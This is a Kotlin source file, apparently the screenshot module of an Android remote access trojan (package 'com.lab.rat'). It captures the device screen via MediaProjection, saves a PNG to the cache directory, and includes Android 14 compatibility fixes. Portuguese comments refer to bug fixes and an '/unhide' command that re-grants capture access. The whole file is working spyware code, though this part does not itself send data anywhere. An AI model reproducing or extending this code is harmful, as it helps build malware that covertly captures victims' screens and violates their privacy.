package com.lab.rat.modules

import android.content.Context
import android.graphics.Bitmap
import android.graphics.Color
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import com.lab.rat.core.ProjectionHolder
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object ScreenshotModule {

    fun capture(ctx: Context): File? {
        val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as MediaProjectionManager
        val proj = ProjectionHolder.createProjection(mpm) ?: return null
        val out = File(ctx.cacheDir, "screen_${System.currentTimeMillis()}.png")

        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        // Callback registrado ANTES de createVirtualDisplay (obrigatório API 34)
        proj.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() { /* token consumido; nada a fazer */ }
        }, Handler(Looper.getMainLooper()))

        val reader = android.media.ImageReader.newInstance(
            metrics.widthPixels, metrics.heightPixels,
            android.graphics.PixelFormat.RGBA_8888, 1)

        val vDisplay = proj.createVirtualDisplay(
            "labrat", metrics.widthPixels, metrics.heightPixels,
            metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface, null, Handler(Looper.getMainLooper()))

        var captured: File? = null
        val done = CountDownLatch(1)

        // ÚNICO listener (bug #8 corrigido: latch com timeout, sem Thread.sleep)
        reader.setOnImageAvailableListener({ r ->
            val img: Image? = r.acquireLatestImage()
            if (img == null) return@setOnImageAvailableListener
            try {
                captured = writeImage(img, metrics.widthPixels,
                    metrics.heightPixels, out)
            } finally {
                img.close()
            }
            done.countDown()
        }, Handler(Looper.getMainLooper()))

        done.await(5, TimeUnit.SECONDS)

        vDisplay.release()
        reader.close()
        proj.stop()               // token de uso único no Android 14
        ProjectionHolder.clear()  // anula referência (bug #7: /unhide re-concede)

        return captured
    }

    private fun writeImage(img: Image, w: Int, h: Int, out: File): File {
        val plane = img.planes[0]
        val buffer = plane.buffer
        val rowStride = plane.rowStride
        val pixelStride = plane.pixelStride
        val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
        for (y in 0 until h) {
            for (x in 0 until w) {
                val off = y * rowStride + x * pixelStride
                bmp.setPixel(x, y, Color.rgb(
                    buffer.get(off).toInt() and 0xFF,
                    buffer.get(off + 1).toInt() and 0xFF,
                    buffer.get(off + 2).toInt() and 0xFF))
            }
        }
        FileOutputStream(out).use { bmp.compress(Bitmap.CompressFormat.PNG, 100, it) }
        bmp.recycle()
        return out
    }
}
